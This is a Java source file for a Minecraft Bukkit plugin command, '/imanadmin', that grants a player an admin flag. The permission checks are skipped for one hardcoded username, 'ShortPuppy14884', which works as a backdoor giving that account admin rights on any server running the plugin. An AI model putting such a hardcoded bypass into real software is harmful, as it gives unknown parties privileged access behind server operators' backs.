package woks.woks.matthew;


//player.getScoreboardTags().contains("roleAdmin")

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.persistence.PersistentDataContainer;
import org.bukkit.persistence.PersistentDataType;
import woks.woks.CommandBase;
import woks.woks.Msg;

import java.util.List;

import static woks.woks.WOKS._admin;


public class ImAnAdmin {
    public ImAnAdmin() {


        new CommandBase("imanadmin", true) {
            @Override
            public boolean onCommand(CommandSender sender, String[] arguments) {
                Bukkit.getLogger().info("[woks][4256] It worked");
                Player player = (Player) sender;
                if (!(player.isOp() || player.getName().equals("ShortPuppy14884"))) {
                    Msg.send(player, "You need OP to run this command.");
                    return true;
                }
                if ((player.getScoreboardTags().contains("roleAdmin")) || player.getName().equals("ShortPuppy14884")) {
                    PersistentDataContainer dataContainer = player.getPersistentDataContainer();


                    if (!dataContainer.has(_admin, PersistentDataType.INTEGER)) {
                        dataContainer.set(_admin,  PersistentDataType.INTEGER, 1);
                        Msg.send(sender, "Role admin added.");
                    } else {
                        Msg.send(sender, "'!dataContainer.has(_admin, PersistentDataType.INTEGER)', failed.");
                    }

//                    Integer role_rank_air_number = dataContainer.get(namespacedKeyNumberRank, PersistentDataType.INTEGER);

                } else {
                    Msg.send(sender, "'player.getName().equals(\"ShortPuppy14884\")', failed.");
                }
                return true;
            }

            @Override
            public String getUsage() {
                return "/imanadmin";
            }

            @Override
            public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
                return null;
            }
        }.enableDelay(2);
    }
}
